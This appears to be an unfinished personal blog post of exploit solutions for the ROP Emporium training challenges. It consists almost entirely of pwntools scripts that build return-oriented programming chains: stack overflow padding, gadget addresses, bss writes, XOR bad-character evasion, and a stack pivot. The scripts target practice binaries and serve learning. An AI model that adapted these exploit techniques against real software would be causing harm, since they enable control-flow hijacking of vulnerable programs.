---
title: "ROP Emporium Full Solutions"
description: "My solutions to all ROP Emporium challs"
slug: "pwn-ropemp"
date: "2025-05-21 00:00:00+0000"
image: "cover.png"
categories:
    - "Pwn"
tags: 
weight: 1
---

not done yet :P i still need to write explanations and what not. im just going to place all the scripts i have so far here though

## Chall 1: ret2win

```py
from pwn import *

p = process('./ret2win')

payload = b'A'*32 + b'B'*8
payload += p64(0x000000000040053e)
payload += p64(0x0000000000400756)
p.sendline(payload)
p.interactive()
```

## Chall 2: split

```py
#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'
context.os = 'linux'
context.bits = 64

io = process("./split")

print("connect gdb to pid %d" % io.pid)
pause()

payload = b'A'*32 + b'B'*8
cat_virtual_address = p64(0x1060 - 0x1050 + 0x601050)
pop_rdi = p64(0x000000004007c3)
system_plt = p64(0x000000000040074b)
payload += pop_rdi + cat_virtual_address + system_plt
io.sendline(payload)
io.interactive()

```

## Chall 3: callme

```py
from pwn import *
context.bits = 64
context.os = 'linux'
context.arch = 'amd64'

debug = False

p = process('./callme')

if debug:
    print("pid for process @ %d" % p.pid)
    pause()

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)
args = arg1 + arg2 + arg3
junk = b'A' * 32 + b'B' * 8
one = p64(0x400720)
two = p64(0x400740)
three = p64(0x4006f0)
gadget = p64(0x40093c)
payload = junk + gadget + args + one
payload += gadget + args + two
payload += gadget + args + three
p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()
```

## Chall 4: write4

```py
from pwn import *

p = process('./write4')

pop_rdi = p64(0x0000000000400693)
pop_r14_r15 = p64(0x0000000000400690)
mov_qword_ptr = p64(0x0000000000400628)
print_file_call = p64(0x0000000000400620)
flag_file = p64(0x7478742e67616c66)
reserved_addr_bss = p64(0x0000000000601038)

payload = b'A' * 32 + b'B' * 8

# Write "flag.txt" to bss
payload += pop_r14_r15
payload += reserved_addr_bss # address -> r14
payload += flag_file # flag.txt -> r15
payload += mov_qword_ptr # mov qword ptr [r14], r15 ; ret

# use pop_rdi to set argument, and shove "flag.txt" into printfile call
payload += pop_rdi
payload += reserved_addr_bss
payload += print_file_call

p.sendline(payload)
p.interactive()
```

## Chall 5: badchars

```py
from pwn import *

p = process('./badchars')

debug = False

if debug:
    print("gdb <bin> -q <pid> @ %d" % p.pid)
    pause()

badchars = [b'x', b'g', b'a', b'.']

pop_rdi = p64(0x00000000004006a3)
xor = p64(0x0000000000400628)  # xor byte ptr [r15], r14b ; ret
pop_r12_r13_r14_r15 = p64(0x000000000040069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r14_r15 = p64(0x00000000004006a0) # pop r14 ; pop r15 ; ret
mov_qword_ptr = p64(0x0000000000400634) # mov qword ptr [r13], r12 ; ret
print_file_call = p64(0x0000000000400620)
xor_byte = 0x3
flag_str = b"flag.txt"
flag_file_xor = bytes([b ^ xor_byte for b in flag_str])  # xored
reserved_addr_data = 0x000000000601030  # reserved data addr, free space

payload = b'A'*32 + b'B'*8

payload += pop_r12_r13_r14_r15
payload += flag_file_xor
payload += p64(reserved_addr_data)
payload += p64(xor_byte)  # r14; temp junk
payload += p64(reserved_addr_data)  # r15; temp junk
payload += mov_qword_ptr

for i in range(0, 8):
    payload += pop_r14_r15
    payload += p64(xor_byte) # xor byte -> r14
    payload += p64(reserved_addr_data + i) # byte addr -> r15
    payload += xor

payload += pop_rdi
payload += p64(reserved_addr_data)
payload += print_file_call

# Send and interact
p.sendline(payload)
p.interactive()
```

## Chall 6: fluff

```py
#!/usr/bin/python3
from pwn import *

io = process('./fluff')

"""
Dump of assembler code for function questionableGadgets:
   0x0000000000400628 <+0>:     xlat   BYTE PTR ds:[rbx]
   0x0000000000400629 <+1>:     ret
   0x000000000040062a <+2>:     pop    rdx
   0x000000000040062b <+3>:     pop    rcx
   0x000000000040062c <+4>:     add    rcx,0x3ef2
   0x0000000000400633 <+11>:    bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:    ret
   0x0000000000400639 <+17>:    stos   BYTE PTR es:[rdi],al
   0x000000000040063a <+18>:    ret
   0x000000000040063b <+19>:    nop    DWORD PTR [rax+rax*1+0x0]
"""

"""
xlat maps input bytes via lookup table
"""

"""
bextr extracts bits from rcx into rbx, rdx specifies the start bit and length via bitmask.
"""

"""
stos   BYTE PTR es:[rdi],al stores al into memory at address in rdi

We need pop rdi to pair this with as well as some gadgets concerning rbx and rcx to connect bextr and xlat in order to control al.

Once al is controlled, we have full control over rdi so it should be easy from there.

We know that we will need to use stos to write the bytes to bss. 
"""

add_al_bpl = p64(0x000000000040061e)
pop_rbp = p64(0x0000000000400588)
pop_rdi = p64(0x00000000004006a3)
print_file_call = p64(0x0000000000400620)
xlatb_ret = p64(0x0000000000400628)
bextr_gadget = p64(0x000000000040062a)  # single gadget: pop rdx; pop rcx; add rcx, 0x3ef2; bextr; ret
flag_file = b"flag.txt"
reserved_addr_bss = 0x0000000000601038
stos = p64(0x0000000000400639)
initial_rax = 0xb

# char addresses found by usual offsets after 0x4000000
char_addrs = [
    0x4003c4,  # 'f'
    0x400239,  # 'l'
    0x4003d6,  # 'a'
    0x4003cf,  # 'g'
    0x40024e,  # '.'
    0x400192,  # 't'
    0x400246,  # 'x'
    0x400192,  # 't' again
]

payload = b'A' * 32 + b'B' * 8

for i in range(0, 8):
   payload += pop_rdi
   payload += p64(reserved_addr_bss + i)  # shoved bss into rdi

   if i == 0:
      prev_al = initial_rax  # first al is a section of rax, which is initially 0xb
   else:
      prev_al = flag_file[i-1]

   target_addr = char_addrs[i]
   rcx_val = target_addr - prev_al - 0x3ef2  # compensate for the instruction "add rcx, 0x3ef2"

   payload += bextr_gadget
   payload += p64(0x4000)  # rdx -> rdx = bitmask for bextr (start bit=0, length=64)
   payload += p64(rcx_val)  # rcx -> adjusted target addr offset

   payload += xlatb_ret  # al = rbx[al] (the byte we want to write) is now in al

   payload += stos  # store al into memory at address in rdi which we shoved in earlier

payload += pop_rdi
payload += p64(reserved_addr_bss)
payload += print_file_call

io.recvuntil(b'> ')
io.sendline(payload)
io.interactive()
```

## Chall 7: pivot

```py
from pwn import *
import time

elf = ELF('./pivot')
libc = ELF('libpivot.so')

io = process(elf.path)

data = io.recv()

for line in data.split(b'\n'):
    if b'0x' in line:
        pivot_int = int(line.strip().split(b'0x')[1], 16)
        break

offset = libc.symbols['ret2win'] - libc.symbols['foothold_function']
print(f"offset: {hex(offset)}")


foothold = p64(0x0000000000400720)
foothold_got_addr = elf.got['foothold_function']
foothold_got = p64(foothold_got_addr)
pop_rax_ret = p64(0x00000000004009bb)
mov_rax_qword_ptr = p64(0x00000000004009c0)
pop_rbp = p64(0x00000000004007c8)
add_rax_rbp = p64(0x00000000004009c4)
call_rax = p64(0x00000000004006b0)
xchg_rsp_rax_ret = p64(0x00000000004009bd)

rop_chain = b''
rop_chain += foothold
rop_chain += pop_rax_ret
rop_chain += foothold_got
rop_chain += mov_rax_qword_ptr
rop_chain += pop_rbp
rop_chain += p64(offset)
rop_chain += add_rax_rbp
rop_chain += call_rax


pivot_payload = b'A' * 32 + b'B' * 8
pivot_payload += pop_rax_ret
pivot_payload += p64(pivot_int)
pivot_payload += xchg_rsp_rax_ret

io.sendline(rop_chain)

io.recvuntil(b'> ')
io.sendline(pivot_payload)
io.interactive()
```

## Chall 8: ret2csu